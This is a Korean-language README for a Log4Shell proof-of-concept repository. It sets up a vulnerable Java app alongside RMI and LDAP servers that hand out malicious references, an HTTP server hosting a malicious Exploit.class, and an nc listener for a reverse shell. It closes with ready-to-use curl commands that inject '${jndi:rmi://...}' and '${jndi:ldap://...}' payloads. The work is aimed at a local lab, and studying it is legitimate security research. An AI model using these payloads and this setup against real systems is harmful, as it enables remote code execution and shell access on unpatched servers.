# Log4Shell-PoC
Log4Shell PoC with RMI, LDAP

---- 

# 각 서비스에 대한 설명

|구분|위치|포트(TCP)|설명|
|:--:|:--:|:--:|:--:|
|`Vulnerable Application`|Docker 컨테이너 | 7777 | 취약한 웹 애플리케이션 서버로, Log4Shell 취약점이 발생된다.|
|`RMI Server` | Docker 컨테이너 | 1099 | Vulnerable Appliation으로 부터 RMI 요청을 전달받아, RCE 를 발생시키기 위한 페이로드를 응답한다.|
|`LDAP Server` | Docker 컨테이너 | 389 (openLDAP Server)8080 (phpLDAPadmin)|Vulnerable Appliation으로 부터 LDAP 요청을 전달받아, 악성 Java 객체를 다운로드 받도록 javaCodeBase 속성 값에 Exploit Server 주소 값을 전달한다.|
|`Exploit Server` | 호스트 | 8888 | /Exploit.class 를 요청할 경우 RCE를 일으키는 악성 Java 객체를 반환한다.|
|`nc -lv 9999` | 호스트 | 9999 | Vulnerable Application과 리버스 방식으로 셸을 연결하기 위함|

---- 

# PoC

## 1. Vulnerable Application 셋팅 및 실행

### 빌드 및 실행

1. [DoTTak/Log4Shell-PoC](https://github.com/DoTTak/Log4Shell-PoC) 저장소로 부터 코드를 내려받은 뒤, 해당 프로젝트로 이동한다.
    
    ```bash
    git clone https://github.com/DoTTak/Log4Shell-PoC.git
    cd Log4Shell-PoC
    ```
    
2. 이후 `vulnerable-application` 폴더로 이동한 뒤, `Dockerfile` 을 빌드하여 도커 이미지를 생성한다.
    
    ```bash
    cd vulnerable-application
    docker build --platform linux/amd64 -t log4shell-poc-app .
    ```
    
3. 생성된 도커 이미지 `log4shell-poc-app:latest` 를 컨테이너로 실행하자.
    
    > 참고로, 웹 애플리케이션 서버 포트는 항상 `7777` 로 오픈 되어 있다. 변경은 `Application.java` 를 수정하면 된다.
    > 
    
    ```bash
    docker run --rm --platform=linux/amd64 --add-host=host.docker.internal:host-gateway --name log4shell-poc-app -p 7777:7777 log4shell-poc-app
    ```

## 2. RMI Server 셋팅 및 실행

### 빌드 및 실행
1.  `rmi-server` 폴더로 이동한 뒤, `Dockerfile` 을 빌드하여 도커 이미지를 생성한다.
    
    ```bash
    docker build --platform linux/amd64 -t log4shell-rmi-server .
    ```
    
2. 생성된 도커 이미지 `log4shell-rmi-server:latest` 를 컨테이너로 실행하자.
    
    ```bash
    docker run --rm --platform=linux/amd64 --add-host=host.docker.internal:host-gateway --name log4shell-rmi-server -p 1099:1099 log4shell-rmi-server
    ```

## 3. LDAP Server 셋팅 및 실행

> 악성 응답 데이터가 이미 셋팅되어 있다. 

### 빌드 및 실행
1. `ldap-server` 폴더로 이동한 뒤, 아래의 명령어를 통해 실행한다.

    ```bash
    docker-compose up -d
    ```

2. 위 명령어가 정상적으로 수행됐으면 [http://localhost:8080](http://localhost:8080)를 브라우저를 통해 접속한다.

## 4. Exploit Server 셋팅 및 실행

> 참고로, 악성 Java 객체가 이미 컴파일 되어 저장소에 Commit 상태이다.

### 빌드 및 실행
1. `exploit-server` 폴더로 이동한 뒤, 아래의 명령어를 통해 `Exploit.java` 를 컴파일한다.

    ```bash
    javac Exploit.java
    ```

2. 그 다음 해당 경로를 악성 자바 객체를 호스팅하기 위해 아래의 명령어를 통해 웹 서버를 실행한다.

    ```bash
    python3 -m http.server 8888
    ```

## 5. Exploit 수행

> Exploit은 Host에서 Vulnerable Application으로 요청을 수행한다.

### [Exploit] Log4Shell using RMI
```bash
curl localhost:7777/log -H 'msg: ${jndi:rmi://host.docker.internal:1099/Services}'
```

### [Exploit] Log4Shell using LDAP
```bash
curl localhost:7777/log -H 'msg: ${jndi:ldap://host.docker.internal:389/cn=payload,ou=payloads,dc=example,dc=com}'
```